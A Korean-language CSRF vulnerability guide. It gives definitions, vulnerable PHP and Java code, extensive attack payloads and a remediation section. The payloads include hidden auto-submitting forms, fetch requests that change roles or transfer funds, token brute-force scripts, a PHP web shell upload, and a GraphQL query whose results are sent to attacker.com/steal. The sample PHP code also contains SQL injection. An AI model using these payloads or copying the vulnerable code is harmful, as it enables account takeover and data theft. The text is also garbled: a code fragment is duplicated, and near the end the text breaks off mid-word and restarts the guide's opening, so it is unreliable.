# CSRF 취약점 가이드

## 목차
1. [정의&원리](#1-정의원리)
2. [기본 페이로드](#2-기본-페이로드)
3. [특수 페이로드](#3-특수-페이로드)
4. [조치 가이드](#4-조치-가이드)

---

## 1. 정의&원리

### CSRF(Cross-Site Request Forgery)란?
사용자가 자신의 의지와는 무관하게 공격자가 의도한 행위(수정, 삭제, 등록 등)를 특정 웹사이트에 요청하게 하는 공격입니다. 사용자가 로그인한 상태에서 공격자가 조작한 링크나 폼을 통해 의도하지 않은 작업을 수행하게 됩니다.

### CSRF 공격 조건
1. **사용자 인증 상태**: 피해자가 대상 사이트에 로그인되어 있어야 함
2. **예측 가능한 요청**: 공격자가 요청 구조를 알 수 있어야 함
3. **토큰 미사용**: CSRF 토큰 등 보호 메커니즘이 없어야 함

### CSRF 공격 유형

#### 1.1. GET 기반 CSRF
- URL 파라미터를 통한 상태 변경
- 이미지 태그, 링크 등을 통한 자동 요청
- 이메일, 게시판 등에 악성 링크 삽입

#### 1.2. POST 기반 CSRF
- 숨겨진 폼을 통한 POST 요청
- JavaScript를 이용한 자동 폼 제출
- AJAX 요청을 통한 백그라운드 공격

#### 1.3. JSON/API 기반 CSRF
- REST API 엔드포인트 공격
- Content-Type 조작을 통한 우회
- CORS 정책 미흡 시 발생

### 공격 시나리오

#### 일반적인 CSRF 공격 시나리오:
1. **정찰**: 대상 사이트의 중요 기능 파악 (계정 변경, 송금 등)
2. **요청 분석**: HTTP 요청 구조 분석 및 필수 파라미터 확인
3. **페이로드 생성**: 악성 HTML/JavaScript 코드 작성
4. **유포**: 이메일, 게시판, 악성 사이트 등을 통해 배포
5. **실행**: 피해자가 링크 클릭 시 자동으로 공격 실행

### 일반적인 취약한 코드 패턴

#### 취약한 계정 정보 변경 (PHP):
```php
// 토큰 검증 없이 POST 요청만으로 계정 정보 변경
if ($_POST['action'] == 'change_password') {
    $new_password = $_POST['new_password'];
    $user_id = $_SESSION['user_id'];
    
    $query = "UPDATE users SET password = '$new_password' WHERE id = $user_id";
    mysql_query($query);
    echo "Password changed successfully";
}
```

#### 취약한 송금 기능 (Java):
```java
@PostMapping("/transfer")
public String transferMoney(@RequestParam int toAccount, 
                          @RequestParam double amount, 
                          HttpSession session) {
    int fromAccount = (Integer) session.getAttribute("userId");
    
    // CSRF 토큰 검증 없이 바로 실행
    bankService.transfer(fromAccount, toAccount, amount);
    return "Transfer completed";
}
```

---

## 2. 기본 페이로드

### 2.1. GET 기반 CSRF 공격

#### 2.1.1. 이미지 태그를 이용한 공격
```html
<!-- 계정 삭제 -->
<img src="http://target.com/delete_account?confirm=yes" width="0" height="0">

<!-- 비밀번호 변경 -->
<img src="http://target.com/change_password?new_password=hacked123" style="display:none">

<!-- 관리자 계정 생성 -->
<img src="http://target.com/admin/create_user?username=attacker&password=pass123&role=admin" hidden>

<!-- 설정 변경 -->
<img src="http://target.com/settings?email=attacker@evil.com&notifications=off">
```

#### 2.1.2. 링크를 이용한 공격
```html
<!-- 사용자 클릭 유도 -->
<a href="http://target.com/transfer?to=attacker&amount=1000">
    무료 상품 받기! 클릭하세요!
</a>

<!-- 자동 리다이렉트 -->
<script>
    window.location.href = "http://target.com/logout";
</script>

<!-- iframe을 이용한 숨김 공격 -->
<iframe src="http://target.com/delete_post?id=123" width="0" height="0" style="display:none"></iframe>
```

#### 2.1.3. 메타 태그를 이용한 자동 리다이렉트
```html
<meta http-equiv="refresh" content="0; url=http://target.com/dangerous_action?confirm=yes">
```

### 2.2. POST 기반 CSRF 공격

#### 2.2.1. 자동 폼 제출
```html
<!-- 기본 자동 제출 폼 -->
<form name="csrf_form" action="http://target.com/change_email" method="POST">
    <input type="hidden" name="email" value="attacker@evil.com">
    <input type="hidden" name="confirm" value="yes">
</form>
<script>
    document.csrf_form.submit();
</script>

<!-- 사용자 상호작용 후 제출 -->
<form id="hidden_form" action="http://target.com/transfer_money" method="POST">
    <input type="hidden" name="to_account" value="attacker_account">
    <input type="hidden" name="amount" value="10000">
</form>
<button onclick="document.getElementById('hidden_form').submit()">
    무료 쿠폰 받기!
</button>
```

#### 2.2.2. AJAX를 이용한 백그라운드 공격
```javascript
// XMLHttpRequest를 이용한 POST 요청
function csrfAttack() {
    var xhr = new XMLHttpRequest();
    xhr.open('POST', 'http://target.com/api/delete_account', true);
    xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
    xhr.send('confirm=yes&reason=user_request');
}

// Fetch API를 이용한 공격
fetch('http://target.com/api/change_role', {
    method: 'POST',
    headers: {
        'Content-Type': 'application/json',
    },
    body: JSON.stringify({
        user_id: 123,
        new_role: 'admin'
    }),
    credentials: 'include'  // 쿠키 포함
});

// jQuery를 이용한 공격
$.post('http://target.com/update_profile', {
    username: 'attacker',
    email: 'attacker@evil.com',
    role: 'admin'
});
```

### 2.3. 파일 업로드 CSRF

#### 2.3.1. multipart/form-data 폼
```html
<form action="http://target.com/upload" method="POST" enctype="multipart/form-data">
    <input type="hidden" name="file" value="malicious_file.php">
    <input type="hidden" name="description" value="Legitimate file">
    <input type="file" name="upload_file" style="display:none">
</form>

<script>
// 가짜 파일 데이터 생성
var form = document.querySelector('form');
var fileInput = document.querySelector('input[type="file"]');

// Blob을 이용한 가짜 파일 생성
var maliciousContent = '<?php system($_GET["cmd"]); ?>';
var blob = new Blob([maliciousContent], {type: 'text/plain'});
var file = new File([blob], 'shell.php', {type: 'text/plain'});

// DataTransfer를 이용해 파일 할당
var dataTransfer = new DataTransfer();
dataTransfer.items.add(file);
fileInput.files = dataTransfer.files;

form.submit();
</script>
```

### 2.4. 소셜 엔지니어링 연계 공격

#### 2.4.1. 이메일을 통한 공격
```html
<!-- HTML 이메일 내용 -->
<p>안녕하세요! 특별 혜택을 위해 아래 링크를 클릭해주세요.</p>
<a href="http://target.com/subscribe_premium?plan=yearly&auto_renew=true">
    프리미엄 1년 무료 사용하기
</a>

<!-- 숨겨진 CSRF 공격 -->
<img src="http://target.com/api/update_payment?card=1234567890123456&exp=12/25" 
     style="width:1px;height:1px;display:none">
```

#### 2.4.2. 게시판을 통한 공격
```html
<!-- 게시글에 삽입된 CSRF 코드 -->
<div>
    <h3>유용한 정보 공유합니다!</h3>
    <p>이 내용을 보시는 분들께 도움이 되었으면 합니다.</p>
    
    <!-- 보이지 않는 CSRF 공격 -->
    <iframe src="http://target.com/admin/delete_user?id=victim_id" 
            width="0" height="0" style="display:none"></iframe>
</div>
```

---

## 3. 특수 페이로드

### 3.1. CSRF 토큰 우회 기법

#### 3.1.1. 토큰 추측 및 브루트포스
```javascript
// 약한 토큰 생성 알고리즘 공격
function bruteForceToken() {
    var possibleTokens = [];
    
    // 시간 기반 토큰 추측
    var currentTime = Date.now();
    for (var i = -1000; i <= 1000; i++) {
        var timestamp = currentTime + i;
        var token = btoa(timestamp.toString()).substr(0, 16);
        possibleTokens.push(token);
    }
    
    // 각 토큰으로 요청 시도
    possibleTokens.forEach(function(token) {
        fetch('http://target.com/api/sensitive_action', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'X-CSRF-Token': token
            },
            body: JSON.stringify({action: 'malicious'}),
            credentials: 'include'
        });
    });
}
```

#### 3.1.2. 토큰 재사용 공격
```html
<!-- 동일 세션에서 토큰 재사용 -->
<form action="http://target.com/transfer" method="POST">
    <input type="hidden" name="csrf_token" value="[이전에 획득한 유효한 토큰]">
    <input type="hidden" name="amount" value="10000">
    <input type="hidden" name="to_account" value="attacker">
</form>
<script>document.forms[0].submit();</script>
```

#### 3.1.3. 토큰 누락 시 기본값 처리 악용
```javascript
// 토큰이 없을 때 기본 처리 로직 악용
fetch('http://target.com/api/action', {
    method: 'POST',
    headers: {
        'Content-Type': 'application/json'
        // CSRF 토큰 헤더 의도적으로 생략
    },
    body: JSON.stringify({
        action: 'delete_account'
    }),
    credentials: 'include'
});
```

### 3.2. SameSite 쿠키 우회

#### 3.2.1. 서브도메인을 이용한 우회
```html
<!-- target.com의 서브도메인에서 공격 -->
<!-- 만약 SameSite=Lax인 경우 -->
<form action="http://target.com/sensitive_action" method="GET">
    <input type="hidden" name="action" value="malicious">
</form>
<script>
    // GET 요청은 SameSite=Lax에서도 허용됨
    document.forms[0].submit();
</script>
```

#### 3.2.2. 팝업 윈도우를 이용한 우회
```javascript
// SameSite=None 쿠키가 있는 경우
function openAttackWindow() {
    var attackWindow = window.open('http://target.com/login', 'attack', 'width=1,height=1');
    
    setTimeout(function() {
        // 로그인 후 공격 실행
        attackWindow.location.href = 'http://target.com/delete_account?confirm=yes';
    }, 3000);
}

// 사용자 클릭 유도
document.body.innerHTML = '<button onclick="openAttackWindow()">특별 혜택 받기!</button>';
```

### 3.3. Content-Type 우회

#### 3.3.1. Simple Request 악용
```javascript
// CORS preflight 없는 요청 타입 사용
fetch('http://target.com/api/transfer', {
    method: 'POST',
    headers: {
        'Content-Type': 'text/plain'  // Simple request
    },
    body: 'to_account=attacker&amount=10000',
    credentials: 'include'
});

// application/x-www-form-urlencoded 사용
fetch('http://target.com/api/action', {
    method: 'POST',
    headers: {
        'Content-Type': 'application/x-www-form-urlencoded'
    },
    body: new URLSearchParams({

body: new URLSearchParams({
        'action': 'delete',
        'user_id': '123'
    }),
    credentials: 'include'
});
```

#### 3.3.2. multipart/form-data 우회
```html
<form action="http://target.com/api/upload" method="POST" enctype="multipart/form-data">
    <input type="hidden" name="file_action" value="delete_all">
    <input type="hidden" name="confirm" value="yes">
</form>
<script>document.forms[0].submit();</script>
```

### 3.4. CSRF + XSS 연계 공격

#### 3.4.1. Stored XSS를 통한 CSRF
```html
<!-- 게시판에 저장된 XSS 코드 -->
<script>
// 사용자가 게시글을 볼 때 자동으로 CSRF 공격 실행
fetch('/api/change_role', {
    method: 'POST',
    headers: {
        'Content-Type': 'application/json',
        'X-Requested-With': 'XMLHttpRequest'
    },
    body: JSON.stringify({
        user_id: getUserId(),  // 현재 사용자 ID 획득
        new_role: 'admin'
    }),
    credentials: 'include'
});

function getUserId() {
    // DOM에서 사용자 ID 추출
    return document.querySelector('[data-user-id]').dataset.userId;
}
</script>
```

#### 3.4.2. DOM XSS를 통한 동적 CSRF
```javascript
// URL Fragment를 이용한 DOM XSS + CSRF
// URL: http://vulnerable.com/page#<script>csrf_attack()</script>

function csrf_attack() {
    // 현재 페이지의 CSRF 토큰 획득
    var token = document.querySelector('meta[name="csrf-token"]').content;
    
    // 토큰을 포함한 CSRF 공격
    var form = document.createElement('form');
    form.method = 'POST';
    form.action = '/admin/create_user';
    
    var inputs = [
        {name: 'csrf_token', value: token},
        {name: 'username', value: 'backdoor'},
        {name: 'password', value: 'secret123'},
        {name: 'role', value: 'administrator'}
    ];
    
    inputs.forEach(function(input) {
        var hiddenInput = document.createElement('input');
        hiddenInput.type = 'hidden';
        hiddenInput.name = input.name;
        hiddenInput.value = input.value;
        form.appendChild(hiddenInput);
    });
    
    document.body.appendChild(form);
    form.submit();
}

// URL fragment에서 스크립트 실행
if (location.hash) {
    document.body.innerHTML += location.hash.substring(1);
}
```

### 3.5. API 기반 CSRF 공격

#### 3.5.1. REST API CSRF
```javascript
// PUT 요청을 통한 데이터 수정
fetch('http://target.com/api/users/123', {
    method: 'PUT',
    headers: {
        'Content-Type': 'application/json'
    },
    body: JSON.stringify({
        role: 'admin',
        permissions: ['read', 'write', 'delete', 'admin']
    }),
    credentials: 'include'
});

// DELETE 요청을 통한 데이터 삭제
fetch('http://target.com/api/important_data/456', {
    method: 'DELETE',
    credentials: 'include'
});

// PATCH 요청을 통한 부분 수정
fetch('http://target.com/api/settings', {
    method: 'PATCH',
    headers: {
        'Content-Type': 'application/json'
    },
    body: JSON.stringify({
        email_notifications: false,
        admin_email: 'attacker@evil.com'
    }),
    credentials: 'include'
});
```

#### 3.5.2. GraphQL CSRF
```javascript
// GraphQL mutation 공격
fetch('http://target.com/graphql', {
    method: 'POST',
    headers: {
        'Content-Type': 'application/json'
    },
    body: JSON.stringify({
        query: `
            mutation {
                updateUser(id: 123, input: {
                    role: ADMIN,
                    email: "attacker@evil.com"
                }) {
                    id
                    role
                }
            }
        `
    }),
    credentials: 'include'
});

// GraphQL을 통한 데이터 추출
fetch('http://target.com/graphql', {
    method: 'POST',
    headers: {
        'Content-Type': 'application/json'
    },
    body: JSON.stringify({
        query: `
            query {
                users {
                    id
                    username
                    email
                    creditCard
                }
            }
        `
    }),
    credentials: 'include'
}).then(response => response.json())
  .then(data => {
      // 데이터를 공격자 서버로 전송
      fetch('http://attacker.com/steal', {
          method: 'POST',
          body: JSON.stringify(data)
      });
  });
```

### 3.6. 모바일 앱 CSRF

#### 3.6.1. WebView 기반 공격
```javascript
// 안드로이드 WebView에서 CSRF 공격
function mobileCSRFAttack() {
    // 앱 내 WebView에서 실행되는 JavaScript
    if (typeof Android !== 'undefined') {
        // 안드로이드 앱의 JavaScript Interface 악용
        Android.performSensitiveAction('delete_account');
    }
    
    // iOS WKWebView의 경우
    if (window.webkit && window.webkit.messageHandlers) {
        window.webkit.messageHandlers.nativeHandler.postMessage({
            action: 'transfer_money',
            amount: 10000,
            to_account: 'attacker'
        });
    }
}
```

#### 3.6.2. 딥링크 악용
```html
<!-- 모바일 앱 딥링크를 통한 CSRF -->
<a href="myapp://transfer?to=attacker&amount=10000">앱에서 보기</a>

<!-- URL Scheme 조작 -->
<script>
window.location.href = "myapp://admin/delete_user?id=123";
</script>
```

### 3.7. 고급 우회 기법

#### 3.7.1. 이중 Submit 쿠키 우회
```javascript
// CSRF 토큰이 쿠키로도 설정되는 경우
document.cookie = "csrf_token=predicted_token_value; path=/";

fetch('http://target.com/api/action', {
    method: 'POST',
    headers: {
        'Content-Type': 'application/json',
        'X-CSRF-Token': 'predicted_token_value'
    },
    body: JSON.stringify({action: 'malicious'}),
    credentials: 'include'
});
```

#### 3.7.2. 토큰 예측 공격
```python
# 약한 토큰 생성 알고리즘 공격
import hashlib
import time

def predict_csrf_tokens():
    # 시간 기반 토큰 예측
    current_time = int(time.time())
    
    predicted_tokens = []
    for offset in range(-300, 301):  # ±5분 범위
        timestamp = current_time + offset
        # 약한 토큰 생성 로직 (예: MD5(timestamp))
        token = hashlib.md5(str(timestamp).encode()).hexdigest()[:16]
        predicted_tokens.append(token)
    
    return predicted_tokens

# 예측된 토큰들로 공격 시도
def attempt_csrf_with_predicted_tokens(target_url, predicted_tokens):
    for token in predicted_tokens:
        response = requests.post(target_url, 
            data={'csrf_token': token, 'action': 'malicious'},
            cookies=get_target_cookies())
        
        if 'success' in response.text.lower():
            print(f"CSRF attack successful with token: {token}")
            break
```

#### 3.7.3. 서브도메인 쿠키 설정 악용
```javascript
// 서브도메인에서 메인 도메인 쿠키 설정
// 공격자가 subdomain.target.com을 장악한 경우

// 메인 도메인용 쿠키 설정
document.cookie = "csrf_token=attacker_controlled_value; domain=.target.com; path=/";

// 메인 도메인에서 CSRF 공격 실행
setTimeout(function() {
    window.open('http://target.com/sensitive_action?csrf_token=attacker_controlled_value');
}, 1000);
```

### 3.8. 플래시/SWF 기반 CSRF

#### 3.8.1. Flash crossdomain.xml 악용
```xml
<!-- 너무 관대한 crossdomain.xml -->
<cross-domain-policy>
    <allow-access-from domain="*" />
    <allow-http-request-headers-from domain="*" headers="*" />
</cross-domain-policy>
```

```actionscript
// Flash에서 CSRF 공격
var request:URLRequest = new URLRequest("http://target.com/sensitive_action");
request.method = URLRequestMethod.POST;
request.data = "action=delete&confirm=yes";

var loader:URLLoader = new URLLoader();
loader.load(request);
```

---

## 4. 조치 가이드

### 4.1. CSRF 토큰 구현

#### 4.1.1. 강력한 토큰 생성
```java
@Component
public class CSRFTokenManager {
    private final SecureRandom secureRandom = new SecureRandom();
    private final Map<String, CSRFToken> tokenStore = new ConcurrentHashMap<>();
    
    public String generateToken(String sessionId) {
        // 암호학적으로 안전한 랜덤 토큰 생성
        byte[] tokenBytes = new byte[32];
        secureRandom.nextBytes(tokenBytes);
        String token = Base64.getEncoder().encodeToString(tokenBytes);
        
        // 토큰 저장 (세션별 관리)
        CSRFToken csrfToken = new CSRFToken(token, Instant.now().plusSeconds(3600));
        tokenStore.put(sessionId, csrfToken);
        
        return token;
    }
    
    public boolean validateToken(String sessionId, String providedToken) {
        CSRFToken storedToken = tokenStore.get(sessionId);
        
        if (storedToken == null) {
            return false;
        }
        
        // 토큰 만료 확인
        if (storedToken.isExpired()) {
            tokenStore.remove(sessionId);
            return false;
        }
        
        // 상수 시간 비교 (타이밍 공격 방지)
        return MessageDigest.isEqual(
            storedToken.getToken().getBytes(),
            providedToken.getBytes()
        );
    }
    
    public void invalidateToken(String sessionId) {
        tokenStore.remove(sessionId);
    }
    
    // 정기적으로 만료된 토큰 정리
    @Scheduled(fixedRate = 300000) // 5분마다
    public void cleanupExpiredTokens() {
        tokenStore.entrySet().removeIf(entry -> entry.getValue().isExpired());
    }
}
```

#### 4.1.2. 이중 Submit 쿠키 패턴
```python
import secrets
import hmac
import hashlib

class DoubleSubmitCSRF:
    def __init__(self, secret_key):
        self.secret_key = secret_key
    
    def generate_token(self, session_id):
        # 랜덤 토큰 생성
        random_token = secrets.token_urlsafe(32)
        
        # HMAC 서명 생성
        signature = hmac.new(
            self.secret_key.encode(),
            f"{session_id}:{random_token}".encode(),
            hashlib.sha256
        ).hexdigest()
        
        csrf_token = f"{random_token}.{signature}"
        return csrf_token
    
    def validate_token(self, session_id, csrf_token_header, csrf_token_cookie):
        # 헤더와 쿠키의 토큰이 일치하는지 확인
        if csrf_token_header != csrf_token_cookie:
            return False
        
        try:
            token_parts = csrf_token_header.split('.')
            if len(token_parts) != 2:
                return False
                
            random_token, signature = token_parts
            
            # 서명 검증
            expected_signature = hmac.new(
                self.secret_key.encode(),
                f"{session_id}:{random_token}".encode(),
                hashlib.sha256
            ).hexdigest()
            
            return hmac.compare_digest(signature, expected_signature)
            
        except Exception:
            return False
```

#### 4.1.3. Origin/Referer 검증
```javascript
// Express.js 미들웨어
const csrfProtection = (req, res, next) => {
    // GET, HEAD, OPTIONS는 제외
    if (['GET', 'HEAD', 'OPTIONS'].includes(req.method)) {
        return next();
    }
    
    const origin = req.get('Origin');
    const referer = req.get('Referer');
    const host = req.get('Host');
    
    // Origin 헤더 확인
    if (origin) {
        const originHost = new URL(origin).host;
        if (originHost !== host) {
            return res.status(403).json({
                error: 'CSRF: Invalid origin',
                code: 'INVALID_ORIGIN'
            });
        }
    }
    // Origin이 없으면 Referer 확인
    else if (referer) {
        const refererHost = new URL(referer).host;
        if (refererHost !== host) {
            return res.status(403).json({
                error: 'CSRF: Invalid referer',
                code: 'INVALID_REFERER'
            });
        }
    }
    // 둘 다 없으면 차단
    else {
        return res.status(403).json({
            error: 'CSRF: Missing origin/referer headers',
            code: 'MISSING_HEADERS'
        });
    }
    
    next();
};

// 사용법
app.use('/api', csrfProtection);
```

### 4.2. SameSite 쿠키 설정

#### 4.2.1. 적절한 SameSite 설정
```javascript
// Express.js 세션 설정
app.use(session({
    secret: 'your-secret-key',
    cookie: {
        httpOnly: true,        // XSS 방지
        secure: true,          // HTTPS 환경에서만
        sameSite: 'strict',    // CSRF 방지 (가장 강력)
        maxAge: 3600000        // 1시간
    }
}));

// 상황별 SameSite 설정
const cookieSettings = {
    // 일반 세션 쿠키
    session: {
        sameSite: 'strict',    // 완전한 CSRF 방지
        secure: true,
        httpOnly: true
    },
    
    // 임베드 콘텐츠가 있는 경우
    embed: {
        sameSite: 'lax',       // Top-level navigation만 허용
        secure: true,
        httpOnly: true
    },
    
    // 서드파티 연동이 필요한 경우
    integration: {
        sameSite: 'none',      // 모든 요청 허용 (추가 보안 조치 필요)
        secure: true,          // HTTPS 필수
        httpOnly: true
    }
};
```

#### 4.2.2. 쿠키 보안 강화
```php
<?php
// PHP 세션 쿠키 보안 설정
ini_set('session.cookie_httponly', 1);
ini_set('session.cookie_secure', 1);
ini_set('session.cookie_samesite', 'Strict');
ini_set('session.use_strict_mode', 1);

class SecureCookieManager {
    public static function setSecureCookie($name, $value, $expire = 3600) {
        $options = [
            'expires' => time() + $expire,
            'path' => '/',
            'domain' => '', // 현재 도메인만
            'secure' => true,
            'httponly' => true,
            'samesite' => 'Strict'
        ];
        
        return setcookie($name, $value, $options);
    }
    
    public static function setCSRFToken($session_id) {
        $token = bin2hex(random_bytes(32));
        
        // 서버 세션에 저장
        $_SESSION['csrf_token'] = $token;
        
        // 쿠키에도 설정 (이중 Submit 패턴)
        self::setSecureCookie('csrf_token', $token);
        
        return $token;
    }
}
?>
```

### 4.3. 프레임워크별 CSRF 보호 구현

#### 4.3.1. Spring Security (Java)
```java
@Configuration
@EnableWebSecurity
public class CSRFSecurityConfig {
    
    @Bean
    public SecurityFilterChain filterChain(HttpSecurity http) throws Exception {
        http
            .csrf(csrf -> csrf
                .csrfTokenRepository(CookieCsrfTokenRepository.withHttpOnlyFalse())
                .requireCsrfProtectionMatcher(new CSRFRequestMatcher())
                .ignoringRequestMatchers("/api/public/**")  // 공개 API 제외
            )
            .sessionManagement(session -> session
                .sessionCreationPolicy(SessionCreationPolicy.IF_REQUIRED)
                .maximumSessions(1)
                .maxSessionsPreventsLogin(false)
            );
        
        return http.build();
    }
    
    // 커스텀 CSRF 매처
    private static class CSRFRequestMatcher implements RequestMatcher {
        @Override
        public boolean matches(HttpServletRequest request) {
            String method = request.getMethod();
            // GET, HEAD, TRACE, OPTIONS는 CSRF 보호 제외
            return !Arrays.asList("GET", "HEAD", "TRACE", "OPTIONS").contains(method);
        }
    }
}

// 컨트롤러에서 토큰 사용
@Controller
public class SecureController {
    
    @PostMapping("/sensitive-action")
    public String performAction(@RequestParam String action,
                              CsrfToken csrfToken,
                              HttpServletRequest request) {
        
        // 추가 검증 로직
        if (!isValidAction(action)) {
            throw new IllegalArgumentException("Invalid action");
        }
        
        // 비즈니스 로직 실행
        return "success";
    }
}
```

#### 4.3.2. Django (Python)
```python
# settings.py
MIDDLEWARE = [
    'django.middleware.csrf.CsrfViewMiddleware',
    # ... 다른 미들웨어들
]

# CSRF 설정
CSRF_COOKIE_SECURE = True
CSRF_COOKIE_HTTPONLY = True
CSRF_COOKIE_SAMESITE = 'Strict'
CSRF_USE_SESSIONS = False
CSRF_COOKIE_AGE = 3600

# views.py
from django.middleware.csrf import get_token
from django.views.decorators.csrf import csrf_protect
from django.utils.decorators import method_decorator

@method_decorator(csrf_protect, name='dispatch')
class SensitiveActionView(View):
    def post(self, request):
        # Django가 자동으로 CSRF 토큰 검증
        action = request.POST.get('action')
        
        # 추가 보안 검증
        if not self.is_valid_request(request):
            return HttpResponseForbidden('Invalid request')
        
        return JsonResponse({'status': 'success'})
    
    def is_valid_request(self, request):
        # Origin/Referer 추가 확인
        origin = request.META.get('HTTP_ORIGIN')
        if origin and not origin.startswith('https://yourdomain.com'):
            return False
        return True

# 템플릿에서 토큰 사용
# template.html
<form method="post">
    {% csrf_token %}
    <input type="text" name="data">
    <button type="submit">Submit</button>
</form>
```

#### 4.3.3. Express.js (Node.js)
```javascript
const csrf = require('csurf');
const cookieParser = require('cookie-parser');

// CSRF 미들웨어 설정
const csrfProtection = csrf({
    cookie: {
        httpOnly: true,
        secure: true,      // HTTPS 환경에서만
        sameSite: 'strict'
    },
    ignoreMethods: ['GET', 'HEAD', 'OPTIONS'],
    value: (req) => {
        // 토큰을 헤더와 바디에서 모두 확인
        return req.body._csrf || 
               req.query._csrf || 
               req.headers['x-csrf-token'] ||
               req.headers['x-xsrf-token'];
    }
});

app.use(cookieParser());
app.use(csrfProtection);

// 에러 처리
app.use((err, req, res, next) => {
    if (err.code === 'EBADCSRFTOKEN') {
        res.status(403).json({
            error: 'CSRF token validation failed',
            code: 'INVALID_CSRF_TOKEN'
        });
    } else {
        next(err);
    }
});

// 토큰을 클라이언트에 제공
app.get('/api/csrf-token', (req, res) => {
    res.json({ csrfToken: req.csrfToken() });
});
```

### 4.4. 프론트엔드 보안 구현

#### 4.4.1. JavaScript에서 CSRF 토큰 처리
```javascript
class CSRFProtectedAPI {
    constructor() {
        this.csrfToken = null;
        this.initCSRFToken();
    }
    
    async initCSRFToken() {
        try {
            const response = await fetch('/api/csrf-token', {
                credentials: 'include'
            });
            const data = await response.json();
            this.csrfToken = data.csrfToken;
            
            // 메타 태그에서도 토큰 획득 시도
            const metaToken = document.querySelector('meta[name="csrf-token"]');
            if (metaToken && !this.csrfToken) {
                this.csrfToken = metaToken.getAttribute('content');
            }
        } catch (error) {
            console.error('Failed to get CSRF token:', error);
        }
    }
    
    async makeSecureRequest(url, options = {}) {
        if (!this.csrfToken) {
            await this.initCSRFToken();
        }
        
        const defaultOptions = {
            credentials: 'include',
            headers: {
                'X-CSRF-Token': this.csrfToken,
                'Content-Type': 'application/json',
                ...options.headers
            }
        };
        
        const mergedOptions = { ...defaultOptions, ...options };
        
        try {
            const response = await fetch(url, mergedOptions);
            
            // 토큰 만료 시 재시도
            if (response.status === 403) {
                await this.initCSRFToken();
                mergedOptions.headers['X-CSRF-Token'] = this.csrfToken;
                return await fetch(url, mergedOptions);
            }
            
            return response;
        } catch (error) {
            console.error('Secure request failed:', error);
            throw error;
        }
    }
}

// 사용 예시
const api = new CSRFProtectedAPI();

// 모든 중요한 요청에 CSRF 토큰 포함
async function deleteAccount() {
    const response = await api.makeSecureRequest('/api/delete-account', {
        method: 'DELETE'
    });
    
    if (response.ok) {
        alert('Account deleted successfully');
    }
}
```

#### 4.4.2. React 컴포넌트에서 CSRF 보호
```jsx
import React, { useState, useEffect } from 'react';

const useCSRFToken = () => {
    const [token, setToken] = useState(null);
    
    useEffect(() => {
        const fetchToken = async () => {
            try {
                const response = await fetch('/api/csrf-token', {
                    credentials: 'include'
                });
                const data = await response.json();
                setToken(data.csrfToken);
            } catch (error) {
                console.error('Failed to fetch CSRF token:', error);
            }
        };
        
        fetchToken();
    }, []);
    
    return token;
};

const SecureForm = () => {
    const csrfToken = useCSRFToken();
    const [formData, setFormData] = useState({});
    
    const handleSubmit = async (e) => {
        e.preventDefault();
        
        if (!csrfToken) {
            alert('CSRF token not available');
            return;
        }
        
        try {
            const response = await fetch('/api/sensitive-action', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                    'X-CSRF-Token': csrfToken
                },
                body: JSON.stringify(formData),
                credentials: 'include'
            });
            
            if (response.ok) {
                alert('Action completed successfully');
            } else {
                alert('Action failed');
            }
        } catch (error) {
            console.error('Request failed:', error);
        }
    };
    
    return (
        <form onSubmit={handleSubmit}>
            <input 
                type="hidden" 
                name="_csrf" 
                value={csrfToken || ''} 
            />
            {/* 폼 필드들 */}
            <button type="submit" disabled={!csrfToken}>
                Submit
            </button>
        </form>
    );
};
```

### 4.5. API 보안 강화

#### 4.5.1. GraphQL CSRF 보호
```javascript
const { GraphQLSchema, GraphQLObjectType, GraphQLString } = require('graphql');

// GraphQL에서 CSRF 토큰 검증
const csrfValidationPlugin = {
    requestDidStart() {
        return {
            didResolveOperation(requestContext) {
                const { request, context } = requestContext;
                
                // Mutation에 대해서만 CSRF 검증
                if (request.operationName && 
                    request.query.includes('mutation')) {
                    
                    const csrfToken = request.http.headers.get('x-csrf-token');
                    if (!context.validateCSRFToken(csrfToken)) {
                        throw new Error('Invalid CSRF token');
                    }
                }
            }
        };
    }
};

// Apollo Server 설정
const server = new ApolloServer({
    typeDefs,
    resolvers,
    plugins: [csrfValidationPlugin],
    context: ({ req }) => ({
        validateCSRFToken: (token) => {
            return validateCSRFToken(req.session.id, token);
        }
    })
});
```

#### 4.5.2. RESTful API CSRF 보호
```python
from flask import Flask, request, session, jsonify
from functools import wraps
import hmac
import hashlib

app = Flask(__name__)

def require_csrf_token(f):
    @wraps(f)
    def decorated_function(*args, **kwargs):
        if request.method in ['POST', 'PUT', 'DELETE', 'PATCH']:
            # 헤더에서 CSRF 토큰 확인
            provided_token = request.headers.get('X-CSRF-Token')
            session_token = session.get('csrf_token')
            
            if not provided_token or not session_token:
                return jsonify({'error': 'CSRF token missing'}), 403
            
            # 상수 시간 비교
            if not hmac.compare_digest(provided_token, session_token):
                return jsonify({'error': 'Invalid CSRF token'}), 403
        
        return f(*args, **kwargs)
    return decorated_function

@app.route('/api/sensitive-action', methods=['POST'])
@require_csrf_token
def sensitive_action():
    # 보안이 중요한 작업 수행
    return jsonify({'status': 'success'})

@app.route('/api/csrf-token', methods=['GET'])
def get_csrf_token():
    if 'csrf_token' not in session:
        session['csrf_token'] = generate_csrf_token()
    
    return jsonify({'csrf_token': session['csrf_token']})
```

### 4.6. 모니터링 및 탐지

#### 4.6.1. CSRF 공격 탐지 시스템
```python
import time
from collections import defaultdict, deque

class CSRFAttackDetector:
    def __init__(self):
        self.failed_attempts = defaultdict(deque)
        self.suspicious_patterns = [
            'missing_csrf_token',
            'invalid_csrf_token',
            'suspicious_referer',
            'missing_origin_header'
        ]
    
    def log_csrf_failure(self, ip_address, reason, user_agent=None):
        current_time = time.time()
        
        # 최근 1시간 내 실패 기록만 유지
        hour_ago = current_time - 3600
        self.faile# CSRF 취약점 가이드

## 목차
1. [정의&원리](#1-정의원리)
2. [기본 페이로드](#2-기본-페이로드)
3. [특수 페이로드](#3-특수-페이로드)
4. [조치 가이드](#4-조치-가이드)

---

## 1. 정의&원리

### CSRF(Cross-Site Request Forgery)란?
사용자가 자신의 의지와는 무관하게 공격자가 의도한 행위(수정, 삭제, 등록 등)를 특정 웹사이트에 요청하게 하는 공격입니다. 사용자가 로그인한 상태에서 공격자가 조작한 링크나 폼을 통해 의도하지 않은 작업을 수행하게 됩니다.

### CSRF 공격 조건
1. **사용자 인증 상태**: 피해자가 대상 사이트에 로그인되어 있어야 함
2. **예측 가능한 요청**: 공격자가 요청 구조를 알 수 있어야 함
3. **토큰 미사용**: CSRF 토큰 등 보호 메커니즘이 없어야 함

